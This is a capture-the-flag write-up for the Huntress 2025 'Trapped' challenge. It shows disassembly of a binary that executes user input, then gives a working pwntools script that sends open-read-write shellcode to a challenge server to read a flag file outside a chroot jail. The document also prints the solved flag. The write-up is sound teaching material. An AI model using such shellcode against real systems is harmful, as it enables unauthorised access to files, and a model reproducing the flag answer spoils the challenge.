# Prompt

![](/huntress_2025/Day_29/Trapped/Challenge_Trapped.png "Challenge Prompt")

# Solution

- You are provided an Elf binary called trapped. When you run it, it prompts you for the flag and mentions that it drops you in chroot jail. 

![Jail 1](/huntress_2025/Day_29/Trapped/Jail.png "Jail 1")

- Any input that matches the flag will fail in the first prompt. The program sets up a chroot jail which doesn’t let you request the flag (in the first prompt). In this prompt, any flag entry will fail and we know we’re looking for /flag.txt. 

![Jail 2](/huntress_2025/Day_29/Trapped/Jail_2.png "Jail 2")

- However, this doesn’t work. So if we throw it into Radare2, we can see what’s going on under the hood.  

```c
0x00001479	lea rsi, str.flag		; "flag" ; const char *s2
0x00001480   mov rdi, rax			; const char *s1
0x00001483   call sym.imp.strstr	; char *strstr(const char *s1, const char *s2)
0x00001488   test rax, rax
0x0000148b   je 0x14a3
0x0000148d   lea rdi, str.Cannot_open_flag_based_files ; 0x2053 ; "Cannot open flag based files"
```

```c
0x00001553   lea rdi, str.What_would_you_like_me_to_run_next_ ; "What would you like me to run next? "
0x0000155a   call sym.imp.puts           ; int puts(const char *s)
0x0000155f   mov rax, qword [buf]		 ; size: 0x1000
0x00001566   mov edx, sym._init          ; size_t nbyte
0x0000156b   mov rsi, rax                ; void *buf
0x0000156e   mov edi, 0                  ; int fildes
0x00001573   call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
...
0x0000159a   mov rdx, qword [buf]
0x000015a1   mov eax, 0
0x000015a6   call rdx
0x000015a8   mov eax, 0
```

- So we can see the second portion reads in user input into a buffer (rax), sets the buffer size, etc. Except, later, we see that the buffer is put into rdx and then executed. So we need to generate a shellcode payload to escape the chroot jail and get the flag value. 

- We can use pwntools and Python to script this out and generate some shellcode for us. I did try using msfvenom with linux/x86/read_file, but with no luck. The executable/target system is x64, so it may not work due to the architecture. 

```Powershell
from pwn import *

# Set the context to 64-bit
context.arch = 'amd64'

# --- Generate the correct shellcode ---
# This assembles the "open-read-write" logic for 64-bit
# 1. open("../../flag.txt", O_RDONLY)
# 2. read(fd, rsp, 100) (reads 100 bytes from the file onto the stack)
# 3. write(1, rsp, 100) (writes those 100 bytes from the stack to stdout)
# 4. exit(0)
shellcode_asm = shellcraft.open("../../flag.txt")
# 'rax' holds the file descriptor from open()
shellcode_asm += shellcraft.read('rax', 'rsp', 100)
shellcode_asm += shellcraft.write(1, 'rsp', 100)
shellcode_asm += shellcraft.exit(0)

# Assemble the assembly instructions into raw bytes
shellcode = asm(shellcode_asm)

# Connect to the remote challenge
r = remote('10.1.211.230', 9999) 

# 1. Bypass the strstr check
r.recvuntil(b"Which file would you like to open?\n")
# Send anything that is not "flag" here
r.sendline(b"test")

# 2. Send the open-read-write shellcode
r.recvuntil(b"What would you like me to run next? \n")
r.sendline(shellcode)

# 3. Read the output from the write() call
log.success("Shellcode sent! Reading flag...")
try:
    # Use recvall to get all output until the connection closes
    flag = r.recvall(timeout=2)
    print(flag.decode())
except EOFError:
    pass

r.close()
```

![Solution](/huntress_2025/Day_29/Trapped/Solution.png "Solution")

# Flag

- flag{5f8c037a7ca4cb89c80174bca5eaf531}